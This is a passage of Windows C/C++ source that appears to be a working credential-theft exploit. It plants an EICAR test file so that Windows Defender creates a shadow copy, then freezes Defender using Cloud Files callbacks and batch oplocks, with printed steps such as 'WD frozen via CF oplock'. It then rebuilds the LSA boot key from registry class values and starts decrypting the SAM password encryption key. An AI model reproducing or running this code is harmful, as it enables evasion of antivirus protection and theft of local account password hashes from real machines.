					while (current)
					{
						if (_wcsicmp(current->name, objdirinfo[i].Name.Buffer) == 0)
						{
							found = true;
							break;
						}
						current = current->next;
					}
					if (found)
						continue;
					else
					{
						srchfound = true;
						wcscat(newvsspath, objdirinfo[i].Name.Buffer);
						break;
					}
				}
			}
		}
	}

	if (!srchfound) {
		if (hstopevent && WaitForSingleObject(hstopevent, 10) == WAIT_OBJECT_0)
		{
			retval = ERROR_CANCELLED;
			goto cleanup;
		}
		restartscan = true;
		goto scanagain;
	}
	if (objdirinfo) {
		free(objdirinfo);
		objdirinfo = NULL;
	}
	NtClose(hobjdir);
	hobjdir = NULL;





	wcscpy(vsswinpath, newvsspath);
	wcscat(vsswinpath, L"\\Windows");
	RtlInitUnicodeString(&_vsswinpath, vsswinpath);
	InitializeObjectAttributes(&objattr2, &_vsswinpath, OBJ_CASE_INSENSITIVE, NULL, NULL);

retry:
	if (hstopevent && WaitForSingleObject(hstopevent, 0) == WAIT_OBJECT_0)
	{
		retval = ERROR_CANCELLED;
		goto cleanup;
	}
	stat = NtCreateFile(&hlk, FILE_READ_ATTRIBUTES, &objattr2, &iostat, NULL, NULL, NULL, FILE_OPEN, NULL, NULL, NULL);
	if (stat == STATUS_NO_SUCH_DEVICE ||
		stat == STATUS_INVALID_DEVICE_REQUEST ||
		stat == STATUS_OBJECT_PATH_NOT_FOUND ||
		stat == STATUS_OBJECT_NAME_NOT_FOUND)
	{
		if (hstopevent && WaitForSingleObject(hstopevent, 50) == WAIT_OBJECT_0)
		{
			retval = ERROR_CANCELLED;
			goto cleanup;
		}
		goto retry;
	}
	if (stat)
	{
		printf("Failed to open volume shadow copy, error : 0x%0.8X\n", stat);
		retval = RtlNtStatusToDosError(stat);
		goto cleanup;


	}
	CloseHandle(hlk);
	if (fullvsspath)
		wcscpy((wchar_t*)fullvsspath, newvsspath);


cleanup:
	if (hobjdir)
		NtClose(hobjdir);
	if (emptybuff)
		free(emptybuff);
	if (vsinitial)
		DestroyVSSNamesList(vsinitial);

	return retval;
}

// Return the process ID of the running Windows Defender service.
DWORD GetWDPID()
{
	
	
	static DWORD retval = 0;
	if (retval)
		return retval;

	SC_HANDLE scmgr = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
	if (!scmgr)
		return 0;
	SC_HANDLE hsvc = OpenService(scmgr, L"WinDefend", SERVICE_QUERY_STATUS);
	CloseServiceHandle(scmgr);
	if (!hsvc)
		return 0;


	SERVICE_STATUS_PROCESS ssp = { 0 };
	DWORD reqsz = sizeof(ssp);
	bool res = QueryServiceStatusEx(hsvc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, reqsz, &reqsz);
	CloseServiceHandle(hsvc);
	if (!res)
		return 0;
	retval = ssp.dwProcessId;
	return retval;

}

#if HAVE_CFAPI

// Cloud Files callback that blocks Defender on a generated placeholder.
void CfCallbackFetchPlaceHolders(
	_In_ CONST CF_CALLBACK_INFO* CallbackInfo,
	_In_ CONST CF_CALLBACK_PARAMETERS* CallbackParameters
) {


	CF_PROCESS_INFO* cpi = CallbackInfo->ProcessInfo;
	DWORD expectedWdPid = GetWDPID();
	if (!cpi) {
		return;
	}
	wchar_t* procname = PathFindFileName(cpi->ImagePath ? cpi->ImagePath : L"(null)");
	(void)procname;
	if (expectedWdPid == cpi->ProcessId)
	{
		cldcallbackctx* ctx = (cldcallbackctx*)CallbackInfo->CallbackContext;
		SetEvent(ctx->hnotifywdaccess);;

		CF_OPERATION_INFO cfopinfo = { 0 };
		cfopinfo.StructSize = sizeof(CF_OPERATION_INFO);
		cfopinfo.Type = CF_OPERATION_TYPE_TRANSFER_PLACEHOLDERS;
		cfopinfo.ConnectionKey = CallbackInfo->ConnectionKey;
		cfopinfo.TransferKey = CallbackInfo->TransferKey;
		cfopinfo.CorrelationVector = CallbackInfo->CorrelationVector;
		cfopinfo.RequestKey = CallbackInfo->RequestKey;
		
		SYSTEMTIME systime = { 0 };
		FILETIME filetime = { 0 };
		GetSystemTime(&systime);
		SystemTimeToFileTime(&systime, &filetime);

		FILE_BASIC_INFO filebasicinfo = { 0 };
		filebasicinfo.FileAttributes = FILE_ATTRIBUTE_NORMAL;
		CF_FS_METADATA fsmetadata = { filebasicinfo, {0x1000} };
		CF_PLACEHOLDER_CREATE_INFO placeholder[1] = { 0 };
		GUID uid = { 0 };
		RPC_WSTR wuid = { 0 };
		UuidCreate(&uid);
		if (UuidToStringW(&uid, &wuid) != RPC_S_OK)
			wuid = NULL;
		wchar_t* wuid2 = (wchar_t*)wuid;
		placeholder[0].RelativeFileName = ctx->filename;

		placeholder[0].FsMetadata = fsmetadata;

		RPC_WSTR wuid_identity = { 0 };
		UuidCreate(&uid);
		if (UuidToStringW(&uid, &wuid_identity) != RPC_S_OK)
			wuid_identity = NULL;
		wchar_t* wuid2_identity = (wchar_t*)wuid_identity;
		placeholder[0].FileIdentity = wuid2_identity ? wuid2_identity : L"";
		placeholder[0].FileIdentityLength = wuid2_identity ? lstrlenW(wuid2_identity) * sizeof(wchar_t) : 0;
		placeholder[0].Flags = CF_PLACEHOLDER_CREATE_FLAG_SUPERSEDE;


		CF_OPERATION_PARAMETERS cfopparams = { 0 };
		cfopparams.ParamSize = sizeof(cfopparams);
		cfopparams.TransferPlaceholders.PlaceholderCount = 1;
		cfopparams.TransferPlaceholders.PlaceholderTotalCount.QuadPart = 1;
		cfopparams.TransferPlaceholders.EntriesProcessed = 0;
		cfopparams.TransferPlaceholders.Flags = CF_OPERATION_TRANSFER_PLACEHOLDERS_FLAG_NONE;
		cfopparams.TransferPlaceholders.PlaceholderArray = placeholder;

		WaitForSingleObject(ctx->hnotifylockcreated, INFINITE);
		HRESULT hs = CfExecute(&cfopinfo, &cfopparams);
		(void)hs;
		if (wuid) RpcStringFreeW(&wuid);
		if (wuid_identity) RpcStringFreeW(&wuid_identity);
		return;
	}
	CF_OPERATION_INFO cfopinfo = { 0 };
	cfopinfo.StructSize = sizeof(CF_OPERATION_INFO);
	cfopinfo.Type = CF_OPERATION_TYPE_TRANSFER_PLACEHOLDERS;
	cfopinfo.ConnectionKey = CallbackInfo->ConnectionKey;
	cfopinfo.TransferKey = CallbackInfo->TransferKey;
	cfopinfo.CorrelationVector = CallbackInfo->CorrelationVector;
	cfopinfo.RequestKey = CallbackInfo->RequestKey;
	CF_OPERATION_PARAMETERS cfopparams = { 0 };
	cfopparams.ParamSize = sizeof(cfopparams);
	cfopparams.TransferPlaceholders.PlaceholderCount = 0;
	cfopparams.TransferPlaceholders.PlaceholderTotalCount.QuadPart = 0;
	cfopparams.TransferPlaceholders.EntriesProcessed = 0;
	cfopparams.TransferPlaceholders.Flags = CF_OPERATION_TRANSFER_PLACEHOLDERS_FLAG_NONE;
	cfopparams.TransferPlaceholders.PlaceholderArray = { 0 };
	HRESULT hs = CfExecute(&cfopinfo, &cfopparams);
	(void)hs;

	return;


}

// Hold Defender in the Cloud Files oplock stage until cleanup is signaled.
DWORD WINAPI FreezeVSS(void* arg)
{
	cloudworkerthreadargs* args = (cloudworkerthreadargs*)arg;
	if (!args)
		return ERROR_BAD_ARGUMENTS;

	HANDLE hlock = NULL;
	HRESULT hs;
	CF_SYNC_REGISTRATION cfreg = { 0 };
	cfreg.StructSize = sizeof(CF_SYNC_REGISTRATION);
	CF_SYNC_POLICIES syncpolicy = { 0 };
	syncpolicy.StructSize = sizeof(CF_SYNC_POLICIES);
	syncpolicy.HardLink = CF_HARDLINK_POLICY_ALLOWED;
	syncpolicy.Hydration.Primary = CF_HYDRATION_POLICY_PARTIAL;
	syncpolicy.Hydration.Modifier = CF_HYDRATION_POLICY_MODIFIER_VALIDATION_REQUIRED;
	syncpolicy.PlaceholderManagement = CF_PLACEHOLDER_MANAGEMENT_POLICY_DEFAULT;
	syncpolicy.InSync = CF_INSYNC_POLICY_NONE;
	CF_CALLBACK_REGISTRATION callbackreg[2];
	callbackreg[0] = { CF_CALLBACK_TYPE_FETCH_PLACEHOLDERS, CfCallbackFetchPlaceHolders };
	callbackreg[1] = { CF_CALLBACK_TYPE_NONE, NULL };
	CF_CONNECTION_KEY cfkey = { 0 };
	OVERLAPPED ovd = { 0 };
	DWORD nwf = 0;
	wchar_t syncroot[MAX_PATH] = { 0 };
	DWORD retval = STATUS_SUCCESS;
	wchar_t lockfile[MAX_PATH];
	wchar_t selfprobe[MAX_PATH] = { 0 };
	cldcallbackctx callbackctx = { 0 };
	bool syncrootregistered = false;
	WIN32_FIND_DATA selfprobeFindData = { 0 };
	HANDLE hselfprobe = INVALID_HANDLE_VALUE;
	GUID uid = { 0 };
	RPC_WSTR wuid = { 0 };
	GUID providerUid = { 0 };
	wchar_t providerName[17] = { 0 };
	wchar_t providerVersion[32] = { 0 };
	UuidCreate(&providerUid);
	{
		const wchar_t providerAlphabet[] = L"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		const BYTE* providerBytes = (const BYTE*)&providerUid;
		int providerNameLength = (providerBytes[13] % 9) + 8;
		for (int i = 0; i < providerNameLength; i++)
			providerName[i] = providerAlphabet[providerBytes[i] % 62];
		swprintf(providerVersion, 32, L"%u.%u",
			(unsigned int)((providerBytes[14] % 9) + 1),
			(unsigned int)((providerBytes[15] % 9) + 1));
	}
	cfreg.ProviderName = providerName;
	cfreg.ProviderVersion = providerVersion;
	UuidCreate(&uid);
	if (UuidToStringW(&uid, &wuid) != RPC_S_OK)
		wuid = NULL;
	wchar_t* wuid2 = wuid ? (wchar_t*)wuid : L"fallback";
	GetModuleFileName(NULL, syncroot, MAX_PATH);
	if (!syncroot[0]) {
		printf("Failed to resolve module path for syncroot.\n");
		retval = GetLastError();
		goto cleanup;
	}
	{
		wchar_t* sep = PathFindFileName(syncroot);
		if (sep && sep > syncroot)
			*(sep - 1) = L'\0';
		else
		{
			printf("Failed to strip filename from module path.\n");
			retval = ERROR_BAD_PATHNAME;
			goto cleanup;
		}
	}

	wcscpy(lockfile, syncroot);
	wcscat(lockfile, L"\\");
	wcscat(lockfile, wuid2);
	wcscat(lockfile, L".lock");
	callbackctx.hnotifywdaccess = CreateEvent(NULL, FALSE, FALSE, NULL);
	callbackctx.hnotifylockcreated = CreateEvent(NULL, FALSE, FALSE, NULL);
	if (!callbackctx.hnotifylockcreated || !callbackctx.hnotifywdaccess)
	{
		printf("Failed to create event, error : %d", GetLastError());
		retval = GetLastError();
		goto cleanup;
	}
	wcscpy(callbackctx.filename, wuid2);
	wcscat(callbackctx.filename, L".lock");
	hlock = CreateFile(lockfile, GENERIC_ALL, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED | FILE_FLAG_DELETE_ON_CLOSE, NULL);
	if (!hlock || hlock == INVALID_HANDLE_VALUE)
	{
		printf("Failed to create lock file %ws error : %d", lockfile, GetLastError());
		retval = GetLastError();
		goto cleanup;
	}
	hs = CfRegisterSyncRoot(syncroot, &cfreg, &syncpolicy, CF_REGISTER_FLAG_NONE);
	if (hs)
	{
		printf("Failed to register syncroot, hr = 0x%0.8X\n", hs);
		retval = ERROR_UNIDENTIFIED_ERROR;
		goto cleanup;
	}
	syncrootregistered = true;
	hs = CfConnectSyncRoot(syncroot, callbackreg, &callbackctx, CF_CONNECT_FLAG_REQUIRE_PROCESS_INFO | CF_CONNECT_FLAG_REQUIRE_FULL_FILE_PATH, &cfkey);
	if (hs)
	{
		printf("Failed to connect to syncroot, hr = 0x%0.8X\n", hs);
		retval = ERROR_UNIDENTIFIED_ERROR;
		goto cleanup;
	}
	wcscpy(selfprobe, syncroot);
	if (selfprobe[wcslen(selfprobe) - 1] != L'\\')
		wcscat(selfprobe, L"\\");
	wcscat(selfprobe, L"*");
	hselfprobe = FindFirstFile(selfprobe, &selfprobeFindData);
	if (hselfprobe != INVALID_HANDLE_VALUE) {
		FindClose(hselfprobe);
		hselfprobe = INVALID_HANDLE_VALUE;
	}
	if (args->hlock) {
		CloseHandle(args->hlock);
		args->hlock = NULL;
	}

	{
		const DWORD kWaitSliceMs = 5000;
		const DWORD kWaitMaxMs = 120000;
		DWORD waited = 0;
		for (;;)
		{
			DWORD wr = WaitForSingleObject(callbackctx.hnotifywdaccess, kWaitSliceMs);
			if (wr == WAIT_OBJECT_0)
			{
				break;
			}
			if (wr != WAIT_TIMEOUT)
			{
				retval = GetLastError();
				goto cleanup;
			}
			waited += kWaitSliceMs;
			if (waited >= kWaitMaxMs)
			{
				retval = WAIT_TIMEOUT;
				goto cleanup;
			}
		}
	}

	ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	if (!ovd.hEvent)
	{
		printf("Failed to create event, error : %d\n", GetLastError());
		retval = GetLastError();
		goto cleanup;
	}
	DeviceIoControl(hlock, FSCTL_REQUEST_BATCH_OPLOCK, NULL, NULL, NULL, NULL, NULL, &ovd);

	if (GetLastError() != ERROR_IO_PENDING)
	{
		printf("Failed to request a batch oplock on the update file, error : %d", GetLastError());
		retval = GetLastError();
		goto cleanup;
	}
	SetEvent(callbackctx.hnotifylockcreated);


	GetOverlappedResult(hlock, &ovd, &nwf, TRUE);

	printf("[4/6] WD frozen via CF oplock.\n");

	SetEvent(args->hvssready);

	WaitForSingleObject(args->hcleanupevent, INFINITE);

	
	
cleanup:

	if (hlock)
		CloseHandle(hlock);
	if (callbackctx.hnotifylockcreated)
		CloseHandle(callbackctx.hnotifylockcreated);
	if (callbackctx.hnotifywdaccess)
		CloseHandle(callbackctx.hnotifywdaccess);
	if (ovd.hEvent)
		CloseHandle(ovd.hEvent);

	if (syncrootregistered)
	{
		CfDisconnectSyncRoot(cfkey);
		CfUnregisterSyncRoot(syncroot);
	}
	if (wuid)
		RpcStringFreeW(&wuid);

	return retval;

}
#else

// Return a not-implemented status when Cloud Files APIs are unavailable.
DWORD WINAPI FreezeVSS(void* arg)
{
	(void)arg;
	return ERROR_CALL_NOT_IMPLEMENTED;
}
#endif


// Trigger Defender remediation and coordinate VSS discovery and freezing.
bool TriggerWDForVS(HANDLE hreleaseevent,wchar_t* fullvsspath)
{
    
    
    

	
	
	
	
	
	{
		wchar_t avver[64] = { 0 };
		DWORD avsz = sizeof(avver);
		LONG rc = RegGetValueW(HKEY_LOCAL_MACHINE,
			L"SOFTWARE\\Microsoft\\Windows Defender\\Signature Updates",
			L"AVSignatureVersion", RRF_RT_REG_SZ, NULL, avver, &avsz);
		bool noSigs = (rc != ERROR_SUCCESS) || avver[0] == L'\0' || wcscmp(avver, L"0.0.0.0") == 0;
		if (noSigs) {
			printf("Defender has no signatures loaded (AVSignatureVersion=%ws).\n"
			       "EICAR will not be detected, so no VSS will be created.\n"
			       "Run \"$env:ProgramFiles\\Windows Defender\\MpCmdRun.exe\" -SignatureUpdate, wait for a newer KB2267602, then retry.\n",
			       avver[0] ? avver : L"(not found)");
			return false;
		}
	}
	

	GUID uid = { 0 };
	RPC_WSTR wuid = { 0 };
	UuidCreate(&uid);
	if (UuidToStringW(&uid, &wuid) != RPC_S_OK || !wuid)
	{
		printf("Failed to generate UUID for work directory.\n");
		return false;
	}
	wchar_t* wuid2 = (wchar_t*)wuid;

	wchar_t workdir[MAX_PATH] = { 0 };
	ExpandEnvironmentStrings(L"%TEMP%\\", workdir, MAX_PATH);
	wcscat(workdir, wuid2);
	wchar_t eicarfilepath[MAX_PATH] = { 0 };
	wcscpy(eicarfilepath, workdir);
	wcscat(eicarfilepath, L"\\");
	{
		GUID fileGuid = { 0 };
		RPC_WSTR wfileGuid = { 0 };
		wchar_t randomBase[33] = { 0 };
		wchar_t randomName[40] = { 0 };
		int out = 0;
		int randomLen = 8;

		if (UuidCreate(&fileGuid) == RPC_S_OK || UuidCreate(&fileGuid) == RPC_S_UUID_LOCAL_ONLY) {
			if (UuidToStringW(&fileGuid, &wfileGuid) == RPC_S_OK && wfileGuid) {
				for (int i = 0; wfileGuid[i] != L'\0' && out < 32; i++) {
					if ((wfileGuid[i] >= L'0' && wfileGuid[i] <= L'9') ||
						(wfileGuid[i] >= L'A' && wfileGuid[i] <= L'F') ||
						(wfileGuid[i] >= L'a' && wfileGuid[i] <= L'f')) {
						randomBase[out++] = wfileGuid[i];
					}
				}
				RpcStringFreeW(&wfileGuid);
				wfileGuid = NULL;
			}
		}
		if (out == 0)
			wcscpy(randomBase, L"a1b2c3d4e5f6");
		randomLen = 6 + ((GetTickCount() ^ uid.Data1) % 15); 
		if (randomLen > (int)wcslen(randomBase))
			randomLen = (int)wcslen(randomBase);
		wcsncpy_s(randomName, randomBase, randomLen);
		wcscat(eicarfilepath, randomName);
		wcscat(eicarfilepath, L".exe");
	}

	HANDLE hlock = NULL;
	wchar_t rstmgr[MAX_PATH] = { 0 };
	ExpandEnvironmentStrings(L"%windir%\\System32\\RstrtMgr.dll", rstmgr, MAX_PATH);
	OVERLAPPED ovd = { 0 };
	char eicar[] = "*H+H$!ELIF-TSET-SURIVITNA-DRADNATS-RACIE$}7)CC7)^P(45XZP\\4[PA@%P!O5X";
	rev(eicar);
	DWORD nwf = 0;
	cloudworkerthreadargs cldthreadargs = { 0 };
	DWORD tid = 0;
	HANDLE hthread = NULL;
	bool dircreated = false;
	bool retval = true;
	HANDLE hfile = NULL;
	HANDLE trigger = NULL;
	HANDLE hthread2 = NULL;
	HANDLE hobj[2] = { 0 };
	DWORD exitcode = STATUS_SUCCESS;
	DWORD waitres = 0;
	HANDLE hfinderstopevent = NULL;
	shadowcopyfinderargs finderargs = { 0 };

	hfinderstopevent = CreateEvent(NULL, TRUE, FALSE, NULL);
	if (!hfinderstopevent)
	{
		printf("Failed to create VSS finder stop event, error : %lu\n", GetLastError());
		retval = false;
		goto cleanup;
	}
	finderargs.fullvsspath = fullvsspath;
	finderargs.hstopevent = hfinderstopevent;
	hthread = CreateThread(NULL, NULL, ShadowCopyFinderThread, &finderargs, NULL, &tid);
	if (!hthread)
	{
		printf("Failed to create worker thread, error : %d", GetLastError());
		retval = false;
		goto cleanup;
	}
	
	dircreated = CreateDirectory(workdir, NULL);
	if (!dircreated)
	{
		printf("Failed to create working directory, error : %d\n",GetLastError());
		retval = false;
		goto cleanup;
	}

	hfile = CreateFile(eicarfilepath, GENERIC_READ | GENERIC_WRITE | DELETE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE, NULL);
	if (!hfile || hfile == INVALID_HANDLE_VALUE)
	{
		printf("Failed to create eicar test file, error : %d\n", GetLastError());
		retval = false;
		goto cleanup;
	}
	if (!WriteFile(hfile, eicar, sizeof(eicar) - 1, &nwf, NULL))
	{
		printf("Failed to write eicar test file, error : %d\n", GetLastError());
		retval = false;
		goto cleanup;
	}

	
	
	
	Sleep(500);
	hlock = CreateFile(rstmgr, GENERIC_READ | SYNCHRONIZE, NULL, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);
	if (!hlock || hlock == INVALID_HANDLE_VALUE)
	{
		printf("Failed to open restart manager dll for exclusive access, error : %d\nTry again later.\n", GetLastError());
		retval = false;
		goto cleanup;
	}
	ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	if (!ovd.hEvent)
	{
		printf("Failed to create event object with error : %d !!!!\n", GetLastError());
		retval = false;
		goto cleanup;
	}

	SetLastError(ERROR_SUCCESS);
	DeviceIoControl(hlock, FSCTL_REQUEST_BATCH_OPLOCK, NULL, NULL, NULL, NULL, NULL, &ovd);

	if (GetLastError() != ERROR_IO_PENDING)
	{
		printf("Failed to request a batch oplock on the update file, error : %d", GetLastError());
		retval = false;
		goto cleanup;
	}
	
	trigger = CreateFile(eicarfilepath, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (trigger && trigger != INVALID_HANDLE_VALUE) {
		CloseHandle(trigger);
	}

	
	
	
	
	{
		const DWORD kSlice  = 5000;  
		const DWORD kMax    = 90000; 
		DWORD elapsed = 0;
		DWORD waitRes = WAIT_TIMEOUT;
		bool  vssFound = false;

		HANDLE waitHandles[2] = { ovd.hEvent, hthread };

		while (elapsed < kMax) {
			DWORD w = WaitForMultipleObjects(2, waitHandles, FALSE, kSlice);

			if (w == WAIT_OBJECT_0) {
				
				GetOverlappedResult(hlock, &ovd, &nwf, FALSE);
				waitRes = WAIT_OBJECT_0;
				break;
			}
			if (w == WAIT_OBJECT_0 + 1) {
				
				GetExitCodeThread(hthread, &exitcode);
				if (exitcode == ERROR_SUCCESS) {
					vssFound = true;
					waitRes = WAIT_OBJECT_0; 
				}
				break;
			}

			elapsed += kSlice;
		}

		if (waitRes != WAIT_OBJECT_0) {
			printf("Timed out waiting for oplock or VSS after %lu ms.\n", elapsed);
			retval = false;
			goto cleanup;
		}

		
		
		
		if (!vssFound) {
			DWORD wvss = WaitForSingleObject(hthread, 30000);
			if (wvss == WAIT_TIMEOUT) {
				printf("Timed out waiting for the VSS finder to complete.\n");
				retval = false;
				goto cleanup;
			}
			if (!GetExitCodeThread(hthread, &exitcode)) {
				printf("Failed to query the VSS finder thread exit code, error %lu.\n", GetLastError());
				retval = false;
				goto cleanup;
			}
			if (exitcode == STILL_ACTIVE) {
				printf("VSS finder thread is still active unexpectedly.\n");
				retval = false;
				goto cleanup;
			}
			if (exitcode != ERROR_SUCCESS) {
				printf("VSS finder exited with error %lu.\n", exitcode);
				retval = false;
				goto cleanup;
			}
		}
	}
	printf("[3/6] VSS snapshot ready.\n");


	cldthreadargs.hcleanupevent = hreleaseevent;
	cldthreadargs.hlock = hlock;
	cldthreadargs.hvssready = CreateEvent(NULL, FALSE, FALSE, NULL);
	
	hthread2 = CreateThread(NULL, NULL, FreezeVSS, &cldthreadargs, NULL, &tid);
		if (!hthread2) {
			printf("Unable to create worker thread, error : %d", GetLastError());
			retval = false;
			goto cleanup;
		}



	hobj[0] = hthread2;
	hobj[1] = cldthreadargs.hvssready;
		waitres = WaitForMultipleObjects(2, hobj, FALSE, INFINITE);

		if (waitres - WAIT_OBJECT_0 == 0)
		{
			DWORD freeze_exit = 0;
			if (GetExitCodeThread(hthread2, &freeze_exit))
				printf("Unable to freeze WD, thread exited prematurely with code %lu.\n", freeze_exit);
			else
				printf("Unable to freeze WD, thread exited prematurely and exit code query failed: %lu.\n", GetLastError());
			retval = false;
		}

cleanup:

	if (hfinderstopevent)
		SetEvent(hfinderstopevent);
	if (hthread) {
		WaitForSingleObject(hthread, 5000);
		CloseHandle(hthread);
	}
	if (hthread2)
		CloseHandle(hthread2);
	if (cldthreadargs.hvssready)
		CloseHandle(cldthreadargs.hvssready);
	if (hfinderstopevent)
		CloseHandle(hfinderstopevent);
	if (ovd.hEvent)
		CloseHandle(ovd.hEvent);
	// hlock is closed inside FreezeVSS via cldthreadargs.hlock when FreezeVSS runs;
	// if we reach cleanup before handing it off, close it ourselves.
	if (hlock && (!hthread2 || cldthreadargs.hlock == hlock))
		CloseHandle(hlock);
	if (hfile)
		CloseHandle(hfile);
	if (dircreated)
		RemoveDirectory(workdir);
	if (wuid)
		RpcStringFreeW(&wuid);

	return retval;



}






// Convert an even-length hexadecimal string to bytes.
void hex_string_to_bytes(const char* hex_string, unsigned char* byte_array, size_t max_len) {
	size_t len = strlen(hex_string);
	if (len % 2 != 0) {
		fprintf(stderr, "Error: Hex string length must be even.\n");
		return;
	}

	size_t byte_len = len / 2;
	if (byte_len > max_len) {
		fprintf(stderr, "Error: Output buffer too small.\n");
		return;
	}

	for (size_t i = 0; i < byte_len; i++) {
		
		unsigned int byte_val;
		if (sscanf(&hex_string[i * 2], "%2x", &byte_val) != 1) {
			fprintf(stderr, "Error: Invalid hex character in string.\n");
			return;
		}
		byte_array[i] = (unsigned char)byte_val;
	}
}

// Reconstruct the system boot key from LSA registry class strings.
bool GetLSASecretKey(unsigned char bootkeybytes[16])
{

	const wchar_t* keynames[] = { {L"JD"}, {L"Skew1"}, {L"GBG"}, {L"Data"} };
	int indices[] = { 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 };


	HKEY hlsa = NULL;
	DWORD err = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Lsa", NULL, KEY_READ, &hlsa);
	if (err != ERROR_SUCCESS || !hlsa)
	{
		printf("Failed to open LSA registry key, error: %lu\n", err);
		return false;
	}
	char data[0x1000] = { 0 };
	DWORD index = 0;
	for (const wchar_t* keyname : keynames)
	{
		DWORD retsz = (DWORD)(sizeof(data) / sizeof(char)) - index;
		HKEY hbootkey = NULL;
		err = RegOpenKeyEx(hlsa, keyname, NULL, KEY_QUERY_VALUE, &hbootkey);
		if (err != ERROR_SUCCESS || !hbootkey)
		{
			if (hbootkey) RegCloseKey(hbootkey);
			continue;
		}
		err = RegQueryInfoKeyA(hbootkey, &data[index], &retsz, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
		if (err == ERROR_SUCCESS)
			index += retsz;
		RegCloseKey(hbootkey);
	}

	RegCloseKey(hlsa);

	if (strlen(data) < 16)
	{
		printf("Boot key mismatch.\n");
		return false;
	}

	
	unsigned char keybytes[16] = { 0 };
	hex_string_to_bytes(data, keybytes, 16);



	for (int i = 0; i < sizeof(keybytes); i++)
	{

		bootkeybytes[i] = keybytes[indices[i]];
	}
	return true;

}

// Decrypt a buffer with an AES-128 CBC key and IV.
void* UnprotectAES(char* lsaKey, char* iv, char* hashdata, unsigned long enclen, int* decryptedlen)
{

	char* decrypted = (char*)malloc(enclen ? enclen : 1);
	if (!decrypted)
		return NULL;
	memmove(decrypted, hashdata, enclen);
	HCRYPTPROV hprov = NULL;

	if (!CryptAcquireContext(&hprov, 0, L"Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, CRYPT_VERIFYCONTEXT) || !hprov)
	{
		free(decrypted);
		return NULL;
	}

	struct aes128keyBlob
	{
		BLOBHEADER hdr;
		DWORD keySize;
		BYTE bytes[16];
	} blob;

	blob.hdr.bType = PLAINTEXTKEYBLOB;
	blob.hdr.bVersion = CUR_BLOB_VERSION;
	blob.hdr.reserved = 0;
	blob.hdr.aiKeyAlg = CALG_AES_128;
	blob.keySize = 16;
	memmove(blob.bytes, lsaKey, 16);
	HCRYPTKEY hcryptkey = NULL;
	if (!CryptImportKey(hprov, (const BYTE*)&blob, sizeof(aes128keyBlob), NULL, NULL, &hcryptkey) || !hcryptkey)
	{
		CryptReleaseContext(hprov, 0);
		free(decrypted);
		return NULL;
	}

	DWORD mode = CRYPT_MODE_CBC;
	CryptSetKeyParam(hcryptkey, KP_IV, (const BYTE*)iv, NULL);
	CryptSetKeyParam(hcryptkey, KP_MODE, (const BYTE*)&mode, NULL);

	DWORD retsz = enclen;
	CryptDecrypt(hcryptkey, NULL, TRUE, CRYPT_DECRYPT_RSA_NO_PADDING_CHECK, (BYTE*)decrypted, &retsz);

	CryptDestroyKey(hcryptkey);
	CryptReleaseContext(hprov, 0);

	if (decryptedlen)
		*decryptedlen = retsz;

	return decrypted;

}

#ifndef SHA256_DIGEST_LENGTH
#define SHA256_DIGEST_LENGTH 32
#endif

// Compute a SHA-256 digest with the Windows CryptoAPI.
bool ComputeSHA256(char* data, int size, char hashout[SHA256_DIGEST_LENGTH])
{


	HCRYPTPROV hprov = NULL;
	CryptAcquireContext(&hprov, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
	HCRYPTHASH Hhash = NULL;
	CryptCreateHash(hprov, CALG_SHA_256, NULL, NULL, &Hhash);
	CryptHashData(Hhash, (const BYTE*)data, size, NULL);
	DWORD md_len = 0;
	DWORD inputsz = sizeof(md_len);
	CryptGetHashParam(Hhash, HP_HASHSIZE, (BYTE*)&md_len, &inputsz, NULL);

	CryptGetHashParam(Hhash, HP_HASHVAL, (BYTE*)hashout, &md_len, NULL);

	CryptDestroyHash(Hhash);
	CryptReleaseContext(hprov, NULL);
	return true;



}

// Decrypt and verify the SAM password encryption key with AES.
void* UnprotectPasswordEncryptionKeyAES(char* data, char* lsaKey, int* keysz)
{

	int hashlen = (unsigned char)data[0];
	int enclen  = (unsigned char)data[4];

	char iv[16] = { 0 };
	memmove(iv, &data[8], sizeof(iv));

	char* cyphertext = (char*)malloc(enclen ? enclen : 1);
	if (!cyphertext) return NULL;
	memmove(cyphertext, &data[0x18], enclen);

	int outsz = 0;
	int pekoutsz = 0;
	char* pek = (char*)UnprotectAES(lsaKey, iv, cyphertext, enclen, &pekoutsz);
	free(cyphertext);
	cyphertext = NULL;

	if (!pek) return NULL;

	char* hashdata = (char*)malloc(hashlen ? hashlen : 1);
	if (!hashdata) { free(pek); return NULL; }
	memmove(hashdata, &data[0x18 + enclen], hashlen);

	char* hash = (char*)UnprotectAES(lsaKey, iv, hashdata, hashlen, &outsz);
	free(hashdata);
	hashdata = NULL;

	if (!hash) { free(pek); return NULL; }

	char hash256[SHA256_DIGEST_LENGTH];

	if (!ComputeSHA256(pek, pekoutsz, hash256))
	{
		free(pek);
		free(hash);
		return NULL;
	}

	if (memcmp(hash256, hash, sizeof(hash256)) != 0)
	{
		printf("Invalid AES password key.\n");
		free(pek);
		free(hash);
		return NULL;
	}
	free(hash);

	if (keysz)
		*keysz = pekoutsz;

	return pek;

}

// Extract the active SAM password encryption key from the account F value.
void* UnprotectPasswordEncryptionKey(char* samKey, unsigned char* lsaKey, int* keysz)
{

	int enctype = (unsigned char)samKey[0x68];
	if (enctype == 2) {
		int endofs = (unsigned char)samKey[0x6c] + 0x68;
		int len = endofs - 0x70;
		if (len <= 0) return NULL;

		char* data = (char*)malloc(len);
		if (!data) return NULL;
		memmove(data, &samKey[0x70], len);
